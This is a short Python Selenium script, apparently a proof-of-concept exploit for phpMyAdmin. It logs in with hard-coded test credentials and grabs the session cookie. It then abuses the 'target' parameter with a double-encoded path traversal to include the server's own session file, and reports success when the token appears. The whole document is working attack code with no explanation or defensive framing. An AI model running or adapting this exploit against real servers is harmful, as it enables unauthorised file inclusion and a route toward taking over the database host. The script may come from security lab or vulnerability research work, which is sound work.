import sys
from selenium import webdriver
from selenium import webdriver
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By


def exp(host):
    firefox_opt = webdriver.FirefoxOptions()
    firefox_opt.add_argument("--headless")
    driver = webdriver.Firefox(firefox_options=firefox_opt)
    url = host + '/index.php'
    driver.get(url)
    #Select(driver.find_element_by_id("sel-lang ")).select_by_value("zh_cn")
    WebDriverWait(driver, 60).until(EC.visibility_of_element_located((By.ID, 'input_username')))
    driver.find_element_by_id("input_username").clear()
    driver.find_element_by_id("input_username").send_keys("cuc")
    driver.find_element_by_id("input_password").clear()
    driver.find_element_by_id("input_password").send_keys("111111")
    driver.find_element_by_id("input_go").click()
    cookie = driver.get_cookies()
    phpadmin_session=cookie[1]['value']
    url=host+'/index.php?target=db_sql.php%253f/../../../../../../../../sessions/sess_'+phpadmin_session
    driver.get(url)

    check =driver.find_element_by_id('page_content').text
    if "PMA_token" in check:
        print('Success Poc!')


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: exp.py host')
        exit(0)
    h = sys.argv[1]
    exp(h)